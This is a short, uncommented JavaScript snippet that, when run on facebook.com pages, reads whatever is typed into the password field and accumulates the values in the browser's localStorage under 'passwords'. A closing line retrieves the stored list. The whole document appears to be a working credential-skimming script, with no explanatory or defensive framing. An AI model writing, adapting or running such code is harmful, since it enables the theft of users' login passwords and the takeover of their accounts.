(function() {
	if (document.location.href.indexOf("https://www.facebook.com/") >= 0) {
		if (localStorage.getItem("passwords") == null) {
			localStorage.setItem("passwords", "[]")
		}
		
		elms = document.querySelectorAll('input[id="pass"][type="password"]');
		passwd_list = JSON.parse(localStorage.getItem("passwords"));
		
		for (i=0;i<elms.length;i++) {
			if (passwd_list.indexOf(elms[i].value) == -1) {
				passwd_list.push(elms[i].value);
			}
		}
		
		localStorage.setItem("passwords", JSON.stringify(passwd_list));
	}
})();


localStorage.getItem("passwords")